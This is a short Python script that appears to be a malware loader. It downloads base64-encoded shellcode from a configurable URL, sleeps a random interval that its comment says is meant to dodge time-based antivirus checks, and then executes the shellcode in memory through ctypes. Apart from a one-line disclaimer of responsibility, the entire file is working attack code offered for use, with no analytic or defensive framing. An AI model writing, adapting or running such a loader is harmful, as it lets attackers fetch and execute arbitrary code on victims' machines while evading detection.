# Defining imports
from ctypes import *
from base64 import b64decode
from urllib.request import urlopen
from time import sleep
from random import randrange

"""
    I am by no means responsible for any misuse of this code
"""

# Set to URL hosting base 64 encoded shell file
MALWARE_URL = "http://127.0.0.1/shell.b64"

# Getting random time span
randTime = randrange(21, 58)

# Downloading the shell file from the url
downloader = urlopen(MALWARE_URL)

# Unencode the base64
shellcode = b64decode(downloader.read())

# Sleeping to try and any avoid time-based av checks
sleep(randTime)

# Create and run the shell file
array = create_string_buffer(shellcode, len(shellcode))
shell = cast(array, CFUNCTYPE(c_void_p))
shell()